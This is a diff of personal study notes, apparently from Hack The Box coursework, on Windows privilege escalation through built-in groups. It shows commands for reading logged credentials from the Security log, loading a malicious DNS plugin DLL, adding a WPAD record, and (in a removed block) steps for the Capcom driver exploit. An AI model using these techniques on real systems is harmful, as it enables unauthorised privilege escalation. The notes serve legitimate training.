@@ -1,7 +1,7 @@
 # Group Privileges
 - Built-in groups are groups that are shipped with the operating system or get added when active directory domain services role is installed on system to promote a server to a Domain Controller
-#### Event Log Reader
-
+## Event Log Reader
+ 
 ```Powershell
 wevtutil qe Security /rd:true /f:text | Select-String "/user"
 ```
@@ -10,7 +10,7 @@ wevtutil qe Security /rd:true /f:text | Select-String "/user"
 ```
 
 
-#### DNSAdmins Group
+## DNSAdmins Group
 
 **Checks whether you are part of the group** 
 ```
@@ -39,7 +39,7 @@ C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Path\to\adduser <-----------
 
 ```
 
-*Finding SID 
+Finding SID 
 ```
 (Get-LocalUser -Name "netadm").SID
 
@@ -73,26 +73,16 @@ Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerN
 >  Recommended to use CMD, not powershell 
 >  Recs also include using net start and net stop instead of sc.exe start dns https://forum.hackthebox.com/t/htb-academy-windows-privilege-escalation-dnsadmins/243482/31
 
-####  Hyper-V Administrators
+## Hyper-V Administrators
 
 - have access to all hyper v features 
 - if domain controllers have been virtualized, then virtualization admins should be considered domain admins 
 - deleting virtual machine attempts to restore original file permissions on corresponding .vhdx file 
-#### Print Operators
+## Print Operators
 - Grants SeLoadDriverPrivilege, which is ability to to administer/connect/disconnect printers as well as login to domain controller
 
 
-
-> [!NOTE]
-> 1. Download tool to enable privilege (https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)
-> 2. Compile privilege using cl.exe from visual studio 
-> 3. Downloadcapcom.sys file  to ``C:\temp``
-> 4. Add reference to drive 
-> 5. Check to make sure capcom driver is not loaded
-> 6. Check it has been enabled 
-> 7. Launch exploit using exploitcapcom.exe
-
-####  Server Operators 
+##  Server Operators 
 - Grants SeBackupPrivilege and SeRestorePrivilege 
 - SeBackupPrivilege
 
